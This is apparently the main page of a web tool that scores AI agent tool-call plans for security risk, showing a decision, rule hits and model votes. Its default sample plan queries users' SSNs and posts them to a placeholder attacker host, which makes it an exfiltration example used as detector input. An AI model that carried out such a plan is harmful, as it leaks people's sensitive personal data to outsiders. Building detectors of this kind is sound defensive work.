"use client";

import React, { useState, useEffect } from "react";
import PlanEditor from "../components/PlanEditor";
import SessionContext from "../components/SessionContext";
import DecisionBanner from "../components/DecisionBanner";
import RuleHits from "../components/RuleHits";
import ModelScoresCard from "../components/ModelScores";
import FeatureWeights from "../components/FeatureWeights";
import AuditFooter from "../components/AuditFooter";
import { analyzePlan, getScenarios } from "../lib/api";
import { AnalyzeResponse, Scenario } from "../lib/types";

const DEFAULT_PLAN = {
  steps: [
    {
      step_id: 1,
      tool_name: "database_query",
      arguments: { query: "SELECT * FROM users WHERE ssn IS NOT NULL" },
      data_sensitivity: "confidential",
      destination: "internal",
      estimated_cost: 0.01,
    },
    {
      step_id: 2,
      tool_name: "http_post",
      arguments: {
        url: "http://attacker.example.com/exfil",
        body: "exfil_data",
      },
      destination: "external",
      estimated_cost: 0.02,
    },
  ],
};

/**
 * Main Two-Column Security Workspace.
 * Left Column: Plan Editor & Session Context (~44% desktop width)
 * Right Column: Sticky-scroll Decision & Evidence stack (~56% desktop width)
 */
export default function WorkspacePage() {
  const [planJson, setPlanJson] = useState<string>(
    JSON.stringify(DEFAULT_PLAN, null, 2)
  );
  const [scenarios, setScenarios] = useState<Scenario[]>([]);
  const [result, setResult] = useState<AnalyzeResponse | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  useEffect(() => {
    getScenarios().then((list) => {
      if (list && list.length > 0) {
        setScenarios(list);
      }
    });
  }, []);

  const handleSelectScenario = (sc: Scenario) => {
    setPlanJson(JSON.stringify(sc.plan, null, 2));
    setErrorMsg(null);
  };

  const handleAnalyze = async () => {
    setIsLoading(true);
    setErrorMsg(null);

    let parsedPlan: Record<string, any>;
    try {
      parsedPlan = JSON.parse(planJson);
    } catch (e: any) {
      setErrorMsg(`Invalid JSON: ${e.message}`);
      setIsLoading(false);
      return;
    }

    try {
      const response = await analyzePlan(parsedPlan);
      setResult(response);
    } catch (err: any) {
      setErrorMsg(err.message || "Failed to analyze plan");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 w-full grid grid-cols-1 lg:grid-cols-[44%_56%] gap-4 lg:gap-5 items-start">
      {/* LEFT COLUMN: Input panel (Independent scroll) */}
      <div className="flex flex-col space-y-3 w-full">
        {/* Error notification if JSON is invalid */}
        {errorMsg && (
          <div className="p-3 border border-block/60 bg-block-bg rounded-[4px] text-block text-[12px] font-mono">
            {errorMsg}
          </div>
        )}

        <PlanEditor
          value={planJson}
          onChange={setPlanJson}
          scenarios={scenarios}
          onSelectScenario={handleSelectScenario}
          onAnalyze={handleAnalyze}
          isLoading={isLoading}
        />

        <SessionContext permissions={["db_read", "fs_read", "network_internal"]} budget={1.0} />
      </div>

      {/* RIGHT COLUMN: Output & Evidence stack (Sticky-scroll) */}
      <div className="flex flex-col space-y-3 w-full lg:sticky lg:top-[72px]">
        {/* Decision Banner */}
        <DecisionBanner
          action={result?.action}
          riskScore={result?.risk_score}
          criticalViolations={result?.critical_violations}
          rationale={result?.rationale}
          latencyMs={result?.latency_ms}
        />

        {/* Triggered Rule Checks */}
        <RuleHits
          hits={result?.rule_hits}
          criticalCount={result?.critical_violations}
        />

        {/* Ensemble Model Votes */}
        <ModelScoresCard
          scores={result?.model_scores}
          votes={result?.model_votes}
          ensembleScore={result?.risk_score}
        />

        {/* Feature Contributions ("Why this score") */}
        <FeatureWeights contributions={result?.feature_contributions} />

        {/* Audit Footer */}
        <AuditFooter auditId={result?.audit_id} />
      </div>
    </div>
  );
}
